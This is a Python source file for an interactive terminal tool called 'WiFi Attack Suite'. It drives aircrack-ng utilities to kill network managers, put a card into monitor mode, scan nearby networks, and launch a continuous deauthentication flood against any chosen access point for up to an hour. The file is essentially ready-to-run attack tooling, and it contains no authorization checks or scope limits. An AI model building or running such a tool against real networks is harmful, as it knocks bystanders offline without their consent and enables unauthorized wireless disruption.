#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced WiFi Attack Suite TUI - Aircrack-ng Integration
=======================================================
Interactive TUI for WiFi scanning, handshake capture, and deauth attacks.
NOTE: Requires root privileges and compatible WiFi card.
Launches attacks in a separate terminal window for live feedback.
"""

import os
import sys
import subprocess
import time
import signal
import csv
import json
import threading
from typing import List, Dict, Optional, Tuple
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.table import Table
from rich.live import Live
from rich.spinner import Spinner
from rich.box import ROUNDED, HEAVY, HEAVY_EDGE
from rich.theme import Theme
from rich.layout import Layout
from rich.style import Style
import readchar

# Theme Configuration
NEON_THEME = Theme({
    "neon.magenta": "bold #ff00f7", "neon.green": "bold #35ff69",
    "neon.yellow": "bold #ffe500", "neon.red": "bold #ff4d4d",
    "neon.cyan": "bold #00e5ff",
    "accent": "bold #00ffc6", "hint": "#9ca3af", "warn": "bold #ff4d4d",
    "success": "bold #00ff00", "error": "bold #ff0000",
})
console = Console(theme=NEON_THEME)

# Global Constants
SCAN_PREFIX = "wifi_scan_output"
CAPTURE_PREFIX = "handshake_capture"
SCAN_RESULTS_FILE = "wifi_scan_results.json"
INTERFACE_PATTERNS = ['wlan', 'wlp', 'wlx', 'wifi', 'ath', 'ra']

class WiFiAttacker:
    def __init__(self):
        self.tools_ok = self.check_tools()
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.target = {}
        self.clients = []
        self.scan_process = None
        self.capture_process = None
        self.attack_process = None
        self.attack_running = False
        self.attack_duration = 60
        self.scan_duration = 15
        self.possible_interface_names = INTERFACE_PATTERNS
        self.auto_detect = True
        self.scan_completed = False

    def save_scan_results(self):
        """Save scan results to JSON file once."""
        if not self.scan_completed and self.networks:
            try:
                with open(SCAN_RESULTS_FILE, 'w') as f:
                    json.dump({
                        "networks": self.networks,
                        "clients": self.clients,
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }, f, indent=4)
                self.scan_completed = True
                return True
            except Exception as e:
                console.print(f"[error]Failed to save scan results: {e}[/error]")
        return False

    def check_tools(self) -> bool:
        """Check for required tools with better error handling."""
        required_tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "iw", "iwconfig", "timeout", "pkill"]
        missing_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run(['which', tool], capture_output=True, check=True)
            except subprocess.CalledProcessError:
                missing_tools.append(tool)
        
        if missing_tools:
            console.print(f"[warn]Missing tools: {', '.join(missing_tools)}[/warn]")
            return False
        return True

    def auto_detect_interface(self) -> bool:
        """Automatically detect and set the best WiFi interface."""
        interfaces = self.get_wifi_interfaces()
        if interfaces:
            self.interface = interfaces[0]
            console.print(f"[success]Auto-detected interface: {self.interface}[/success]")
            return True
        return False

    def get_wifi_interfaces(self) -> List[str]:
        """Modern interface detection with multiple methods."""
        interfaces = []
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, check=True)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    interfaces.append(line.split()[-1])
        except subprocess.CalledProcessError: pass
        
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces.extend(line.split()[0] for line in result.stdout.split('\n') if "IEEE 802.11" in line or "ESSID" in line)
        except FileNotFoundError: pass
        
        interfaces = list(dict.fromkeys(iface for iface in interfaces if iface))
        if not interfaces:
            console.print("[warn]No WiFi interfaces found.[/warn]")
        return interfaces

    def toggle_monitor_mode(self, interface: str, start: bool = True) -> Tuple[bool, str]:
        """Improved monitor mode handling."""
        if not interface: return False, "No interface specified"
        
        action = "start" if start else "stop"
        if start:
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True, text=True)
            command = ['sudo', 'airmon-ng', 'start', interface]
        else:
            command = ['sudo', 'airmon-ng', 'stop', interface]
        
        try:
            with Live(Spinner("dots", text=Text(f"{'Enabling' if start else 'Disabling'} monitor mode...", style="neon.yellow")), console=console, transient=True):
                proc = subprocess.run(command, capture_output=True, text=True, timeout=30)
            output = proc.stdout + proc.stderr
            if proc.returncode != 0: return False, f"Error: {output.strip() or 'Unknown error'}"
            
            if start:
                mon_iface = None
                for line in output.split('\n'):
                    if "monitor mode enabled on" in line or "(monitor mode enabled)" in line:
                        mon_iface = next((p.strip('[]()') for p in line.split() if any(pat in p for pat in INTERFACE_PATTERNS)), None)
                        break
                if not mon_iface: mon_iface = f"{interface}mon" if 'mon' not in interface else interface
                self.monitor_interface = mon_iface
                return True, f"Monitor mode enabled on {mon_iface}"
            else:
                self.monitor_interface = None
                return True, "Monitor mode disabled"
        except Exception as e:
            return False, f"Unexpected error: {str(e)}"

    def set_channel(self, channel: str):
        """Sets the monitor interface to a specific channel."""
        if not self.monitor_interface: return
        try:
            subprocess.run(['sudo', 'iwconfig', self.monitor_interface, 'channel', channel], capture_output=True, check=True, timeout=10)
        except Exception as e:
            console.print(f"[warn]Could not set channel to {channel}: {e}[/warn]")

    def scan_for_networks(self, scan_duration: int = 15) -> Optional[str]:
        """Enhanced network scanning."""
        if not self.monitor_interface: return "Monitor interface not active"
        for f in os.listdir('.'):
            if f.startswith(SCAN_PREFIX):
                try: os.remove(f)
                except OSError: pass
        command = ['sudo', 'airodump-ng', '-w', SCAN_PREFIX, '--output-format', 'csv', '--write-interval', '1', self.monitor_interface]
        try:
            with Live(Spinner("dots", text=Text(f"Scanning for {scan_duration}s...", style="accent")), console=console, transient=True):
                self.scan_process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                time.sleep(scan_duration)
        except Exception as e:
            return f"Scan failed: {str(e)}"
        finally:
            if self.scan_process:
                try: os.killpg(os.getpgid(self.scan_process.pid), signal.SIGTERM)
                except (ProcessLookupError, OSError): pass
                self.scan_process = None
        error = self._parse_scan_results()
        if not error: self.save_scan_results()
        return error

    def _parse_scan_results(self) -> Optional[str]:
        """Robust CSV parsing."""
        try:
            csv_file = next((f for f in os.listdir('.') if f.startswith(SCAN_PREFIX) and f.endswith('.csv')), None)
            if not csv_file: return "Scan output file not found"
            self.networks, self.clients = [], []
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            client_section = False
            for line in lines:
                if not line: continue
                if "BSSID, First time seen" in line and "Station MAC" not in lines[0]: client_section = False; continue
                if "Station MAC" in line: client_section = True; continue
                parts = [p.strip() for p in line.split(',')]
                if not client_section and len(parts) >= 14 and parts[0] != 'BSSID':
                    self.networks.append({"bssid": parts[0], "channel": parts[3], "speed": parts[4], "privacy": parts[5], "power": parts[8], "essid": parts[13] or "Hidden"})
                elif client_section and len(parts) >= 6 and parts[0] != 'Station MAC':
                    self.clients.append({"mac": parts[0], "bssid": parts[5]})
            return None
        except Exception as e:
            return f"Error parsing results: {str(e)}"

    def find_terminal_emulator(self) -> Optional[str]:
        """Finds a suitable terminal emulator available on the system."""
        terminals = ["gnome-terminal", "konsole", "terminator", "tilix", "xfce4-terminal", "xterm"]
        for term in terminals:
            try:
                subprocess.run(['which', term], check=True, capture_output=True)
                return term
            except subprocess.CalledProcessError:
                continue
        return None

    def continuous_deauth_attack(self, target_bssid: str, target_channel: str, duration: int = 60) -> Tuple[bool, str]:
        """Launches the deauth attack in a new terminal window."""
        if not self.monitor_interface: return False, "Monitor interface not active"
        if self.attack_running: return False, "Attack already running"

        terminal = self.find_terminal_emulator()
        if not terminal: return False, "No supported terminal emulator found (e.g., gnome-terminal, xterm)"

        self.set_channel(target_channel)
        
        attack_command = (f"echo 'ATTACKING {target_bssid} for {duration} seconds...'; "
                          f"sudo timeout {duration}s aireplay-ng -0 0 -a {target_bssid} {self.monitor_interface}; "
                          f"echo 'Attack finished. Closing terminal in 3 seconds...'; sleep 3")

        if terminal in ["gnome-terminal", "xfce4-terminal", "terminator", "tilix"]:
            command_to_run = [terminal, '--', 'bash', '-c', attack_command]
        elif terminal == "konsole":
            command_to_run = [terminal, '-e', 'bash', '-c', attack_command]
        else: # xterm
            command_to_run = [terminal, '-e', attack_command]

        try:
            self.attack_process = subprocess.Popen(command_to_run, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.attack_running = True
            return True, f"Attack launched in new terminal for {duration}s"
        except Exception as e:
            return False, f"Failed to launch terminal: {e}"

    def stop_deauth_attack(self) -> Tuple[bool, str]:
        """Stops the running deauth attack. Monitor mode remains active."""
        if not self.attack_running: return True, "No attack running"

        try:
            subprocess.run(['sudo', 'pkill', '-f', 'aireplay-ng'], capture_output=True, text=True)

            self.attack_running = False
            if self.attack_process:
                self.attack_process.terminate()
                self.attack_process = None

            return True, "Attack stopped. Monitor mode remains active."
        except Exception as e:
            self.attack_running = False
            self.attack_process = None
            return False, f"Error stopping attack: {e}"
            
    def _handle_scanning(self, scan_duration: int) -> Optional[str]:
        """Wrapper for scanning operations."""
        if not self.monitor_interface:
            return "Enable monitor mode first"
        self.scan_completed = False
        return self.scan_for_networks(scan_duration)

def create_header() -> Panel:
    """Create the TUI header with ASCII art."""
    banner = r"""
 __      __ .__   _____ .__      _________                        
/  \    /  \|__|_/ ____\|__|    /   _____/  ____  _____     ____  
\   \/\/   /|  |\   __\ |  |    \_____  \ _/ ___\ \__  \   /    \ 
 \        / |  | |  |   |  |    /        \\  \___  / __ \_|   |  \
  \__/\  /  |__| |__|   |__|   /_______  / \___  >(____  /|___|  /
       \/                              \/      \/      \/      \/ 
"""
    title = Text(" WIFI ATTACK SUITE ", style="bold #ff00f7 on #111111")
    # <<< MODIFIED: Replaced the Turkish motto with a thematic English one.
    motto = "In the digital ether, silence is just a signal you haven't decoded yet."
    
    header_content = Text.assemble(
        Text.from_ansi(banner.strip("\n")),
        "\n\n", # Added an extra newline for better spacing
        (motto, "neon.red")
    )
    
    return Panel(Align.center(header_content), title=title, border_style="neon.cyan", box=HEAVY_EDGE, padding=(1, 2))

def check_privileges() -> bool:
    """Check for root/admin privileges."""
    is_root = (os.geteuid() == 0) if os.name != 'nt' else False # Simplified for Linux
    if not is_root:
        console.print(Panel("[bold warn]Root privileges required![/bold warn]\nPlease run with 'sudo'.",
                            title="[bold red]PRIVILEGE ERROR[/bold red]", border_style="red", padding=(1, 2)))
        return False
    return True

def main():
    """Main TUI event loop."""
    if not check_privileges(): return
        
    attacker = WiFiAttacker()
    if not attacker.tools_ok:
        console.print(Panel("[bold warn]Required tools not found![/bold warn]\nInstall with: [neon.green]sudo apt install aircrack-ng procps coreutils[/neon.green]",
                            title="[bold red]MISSING DEPENDENCIES[/bold red]", border_style="red", padding=(1, 2)))
        return

    if attacker.auto_detect:
        attacker.auto_detect_interface()
        if attacker.interface:
            success, msg = attacker.toggle_monitor_mode(attacker.interface, start=True)
            console.print(Panel(msg, title="[success]AUTO CONFIG[/success]" if success else "[error]AUTO CONFIG[/error]",
                                style="success" if success else "error", padding=(1, 2)))
            time.sleep(1)

    active_index, content_type, error_message, network_index, interfaces = 0, "main_menu", "", 0, []

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        
        layout = Layout()
        # <<< FIX: Increased header size from 8 to 12 to fit the banner properly.
        # <<< MODIFIED: Increased header size further to 14 to fit the new motto.
        layout.split(
            Layout(create_header(), size=12), 
            Layout(name="body")
        )
        
        monitor_status = f"ON ({attacker.monitor_interface})" if attacker.monitor_interface else "OFF"
        monitor_color = "neon.green" if attacker.monitor_interface else "neon.yellow"
        attack_status = "RUNNING" if attacker.attack_running else "STOPPED"
        attack_color = "neon.red" if attacker.attack_running else "neon.green"
        
        options = ["Select Interface", f"Toggle Monitor [bold {monitor_color}]({monitor_status})[/]", "Scan Networks",
                   "Manual Network Select", f"Stop All Attacks [bold {attack_color}]({attack_status})[/]", "Exit"]
        
        menu_items = [Text.from_markup(f" {'➤' if i == active_index else '·'} {opt}", style="accent" if i == active_index else "hint") for i, opt in enumerate(options)]
        
        sidebar = Panel(Align.left(Text("\n").join(menu_items)), title="[neon.magenta]MENU[/]", border_style="neon.magenta", box=ROUNDED, padding=(1, 2), width=30)

        main_panel = Panel("", padding=(1, 2), box=ROUNDED, expand=True)

        if content_type == "main_menu":
            status_table = Table.grid(padding=(0, 2))
            status_table.add_row("[hint]Interface:", f"[accent]{attacker.interface or 'None'}[/]")
            status_table.add_row("[hint]Monitor Mode:", f"[accent]{monitor_status}[/]")
            status_table.add_row("[hint]Networks Found:", f"[accent]{len(attacker.networks)}[/]")
            status_table.add_row("[hint]Target:", f"[accent]{attacker.target.get('essid', 'None')}[/]")
            status_table.add_row("[hint]Attack Status:", f"[accent]{attack_status}[/]")
            status_table.add_row("[hint]Scan Duration:", f"[accent]{attacker.scan_duration}s[/]")
            status_table.add_row("[hint]Attack Duration:", f"[accent]{attacker.attack_duration}s[/]")
            main_panel = Panel(Align.center(status_table, vertical="middle"), title="[neon.magenta]STATUS[/]", box=ROUNDED, padding=(1, 2), expand=True)
            
        elif content_type == "select_interface":
            if not interfaces: interfaces = attacker.get_wifi_interfaces()
            text = Text.assemble(*[f"{i+1}. {iface}\n" for i, iface in enumerate(interfaces)], ("\nSelect number or Q to cancel", "hint")) if interfaces else Text("No WiFi interfaces detected!", style="warn")
            main_panel = Panel(Align.center(text), title="[neon.magenta]INTERFACE SELECTION[/]", box=ROUNDED, padding=(1, 2), expand=True)
            
        elif content_type == "show_networks":
            if attacker.networks:
                table = Table(title="[neon.magenta]Discovered Networks[/]", box=ROUNDED, show_header=True, header_style="neon.cyan", expand=True)
                table.add_column("#", style="accent", width=4); table.add_column("SSID", style="neon.green", min_width=20); table.add_column("BSSID", style="neon.yellow", width=18)
                table.add_column("CH", style="neon.cyan", width=4); table.add_column("PWR", style="neon.red", width=5); table.add_column("ENC", style="hint", width=8)
                for i, net in enumerate(attacker.networks):
                    table.add_row(str(i+1), net['essid'], net['bssid'], net['channel'], net['power'], net['privacy'], style=Style(bold=True, color="bright_white") if i == network_index else "")
                main_panel = Panel(table, title="[neon.magenta]NETWORKS[/]", subtitle="[hint]↑/↓ to select, ENTER to attack, Q to cancel[/hint]", box=ROUNDED, padding=(1, 2), expand=True)
            else:
                main_panel = Panel(Align.center(Text("No networks found. Scan first!", style="hint")), title="[neon.magenta]NETWORKS[/]", box=ROUNDED, padding=(1, 2), expand=True)
        
        elif content_type == "scan_duration":
            text = Text.assemble(("Set Scan Duration (seconds):\n\n", "neon.yellow"), (f"Current: {attacker.scan_duration}s\n\n", "accent"), ("↑/↓ to adjust, ENTER to confirm, Q to cancel", "hint"))
            main_panel = Panel(Align.center(text), title="[neon.magenta]SCAN DURATION[/]", box=ROUNDED, padding=(1, 2), expand=True)

        elif content_type == "attack_duration":
            text = Text.assemble(("Set Attack Duration (seconds):\n\n", "neon.yellow"), (f"Current: {attacker.attack_duration}s\n\n", "accent"), ("↑/↓ to adjust, ENTER to confirm, Q to cancel", "hint"))
            main_panel = Panel(Align.center(text), title="[neon.magenta]DURATION SETTING[/]", box=ROUNDED, padding=(1, 2), expand=True)

        if error_message: main_panel.border_style = "warn"; main_panel.title = f"[warn]ERROR: {error_message}[/warn]"; error_message = ""
        
        layout["body"].split_row(Layout(sidebar, size=30), Layout(main_panel, name="main_content", ratio=1))
        
        try:
            console.print(layout)
            key = readchar.readkey()
            
            if content_type == "select_interface":
                if key.lower() == 'q': content_type = "main_menu"
                elif key.isdigit() and 0 <= int(key) - 1 < len(interfaces):
                    attacker.interface = interfaces[int(key) - 1]; time.sleep(1); content_type = "main_menu"
            
            elif content_type == "scan_duration":
                if key.lower() == 'q': content_type = "main_menu"
                elif key == readchar.key.UP: attacker.scan_duration += 5
                elif key == readchar.key.DOWN: attacker.scan_duration = max(15, attacker.scan_duration - 5)
                elif key == readchar.key.ENTER:
                    err = attacker._handle_scanning(attacker.scan_duration)
                    if err:
                        error_message = err
                    else:
                        console.print(Panel(f"Found {len(attacker.networks)} networks", title="[success]SCAN COMPLETE[/]", style="success", padding=(1, 2)))
                        time.sleep(1)
                    content_type = "main_menu"

            elif content_type == "show_networks":
                if key.lower() == 'q': content_type = "main_menu"
                elif key == readchar.key.UP: network_index = max(0, network_index - 1)
                elif key == readchar.key.DOWN: network_index = min(len(attacker.networks) - 1, network_index + 1)
                elif key == readchar.key.ENTER and attacker.networks: attacker.target = attacker.networks[network_index]; content_type = "attack_duration"
            
            elif content_type == "attack_duration":
                if key.lower() == 'q': content_type = "main_menu"
                elif key == readchar.key.UP: attacker.attack_duration = min(attacker.attack_duration + 30, 3600)
                elif key == readchar.key.DOWN: attacker.attack_duration = max(attacker.attack_duration - 30, 30)
                elif key == readchar.key.ENTER and attacker.target:
                    success, msg = attacker.continuous_deauth_attack(attacker.target['bssid'], attacker.target['channel'], attacker.attack_duration)
                    panel_title = "[success]ATTACK LAUNCHED[/]" if success else "[error]ATTACK FAILED[/]"
                    console.print(Panel(msg, title=panel_title, style="success" if success else "error", padding=(1, 2))); time.sleep(1)
                    content_type = "main_menu"
            
            elif content_type == "main_menu":
                if key == readchar.key.UP: active_index = max(0, active_index - 1)
                elif key == readchar.key.DOWN: active_index = min(len(options) - 1, active_index + 1)
                elif key == readchar.key.ENTER:
                    if active_index == 0: interfaces = []; content_type = "select_interface"
                    elif active_index == 1:
                        if attacker.monitor_interface: success, msg = attacker.toggle_monitor_mode(attacker.monitor_interface, start=False)
                        elif attacker.interface: success, msg = attacker.toggle_monitor_mode(attacker.interface, start=True)
                        else: error_message = "Select interface first!"; continue
                        console.print(Panel(msg, title="[success]SUCCESS[/]" if success else "[error]ERROR[/]", style="success" if success else "error", padding=(1, 2))); time.sleep(1)
                    elif active_index == 2:
                        if not attacker.monitor_interface:
                            error_message = "Enable monitor mode first!"
                        else:
                            content_type = "scan_duration"
                    elif active_index == 3:
                        if not attacker.networks: error_message = "Scan networks first!"
                        else: content_type = "show_networks"; network_index = 0
                    elif active_index == 4:
                        if attacker.attack_running:
                            success, msg = attacker.stop_deauth_attack()
                            console.print(Panel(msg, title="[success]ATTACK STOPPED[/]", style="success", padding=(1, 2))); time.sleep(1)
                        else: error_message = "No attack running"
                    elif active_index == 5: break
                elif key.lower() == 'q': break
        except (KeyboardInterrupt, EOFError): break

    if attacker.attack_running: attacker.stop_deauth_attack()
    if attacker.monitor_interface: attacker.toggle_monitor_mode(attacker.monitor_interface, start=False)
    console.clear()
    os.system('reset')
    console.print(Panel("[bold neon.green]Exiting WiFi Attack Suite...[/bold neon.green]", style="success", padding=(1, 2)))

if __name__ == "__main__":
    main()
